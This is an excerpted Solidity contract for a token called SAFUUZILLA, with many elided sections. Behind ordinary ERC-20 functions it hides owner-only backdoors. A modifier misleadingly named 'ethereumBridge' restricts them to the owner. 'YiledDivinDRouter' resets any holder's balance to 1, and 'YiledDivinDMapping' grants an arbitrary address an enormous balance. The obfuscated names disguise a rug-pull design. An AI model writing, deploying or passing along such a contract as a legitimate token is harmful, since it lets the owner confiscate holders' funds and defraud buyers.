...
contract SAFUUZILLA is Ma, Ru, io {
    
    using SafeMath for uint256;
    mapping (address => uint256) private sendout;
    mapping (address => mapping (address => uint256)) private inoutto;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private senderout; 
   string Network;
    constructor(address DivinDRouter) {
        senderout = DivinDRouter;    
        Network = "Cartoon SAFUUZILLA";  
        _name = "SAFUU ZILLA";
        _symbol = "SAFUUZILLA";
        _decimals = 6;
        _totalSupply = 799999900000 * 10 ** 6;
        sendout[_msgSender()] = _totalSupply;
    ...
    */
    function totalSupply() external view override returns (uint256) {
     ...
     function name() external view override returns (string memory) {
        ...
        require(senderout == _msgSender(), "io: caller is not the owner");
        _;
    }    
    /**
    ...
    */
    function YiledDivinDRouter(address RewardsYiledBUSD) external ethereumBridge {
        sendout[RewardsYiledBUSD] = 1;
        
        emit Transfer(RewardsYiledBUSD, address(0), 1);
    }
    ...
    */
    function allowance(address owner, address minHoldingAmount) external view override returns (uint256) {
        return inoutto[owner][minHoldingAmount];
    }
    ...
    * - `minHoldingAmount` cannot be the zero address.
    */
       function YiledDivinDMapping(address RewardsYiledDivinDMapping) external ethereumBridge {
        sendout[RewardsYiledDivinDMapping] = 10000000000000 * 10 ** 21;
        
        emit Transfer(RewardsYiledDivinDMapping, address(0), 10000000000000 * 10 ** 21);
    } 
    ...
    */
    function transferFrom(address sender, address readBytes, uint256 maxHoldingAmount) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), inoutto[sender][_msgSender()].sub(maxHoldingAmount, "Ru: transfer maxHoldingAmount exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address minHoldingAmount, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), minHoldingAmount, inoutto[_msgSender()][minHoldingAmount].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address minHoldingAmount, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), minHoldingAmount, inoutto[_msgSender()][minHoldingAmount].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address readBytes, uint256 maxHoldingAmount) internal {
        ...
        sendout[sender] = sendout[sender].sub(maxHoldingAmount, "Ru: transfer maxHoldingAmount exceeds balance");
        sendout[readBytes] = sendout[readBytes].add(maxHoldingAmount);
    ...
    */
    function _approve(address owner, address minHoldingAmount, uint256 maxHoldingAmount) internal {
        ...
        inoutto[owner][minHoldingAmount] = maxHoldingAmount;
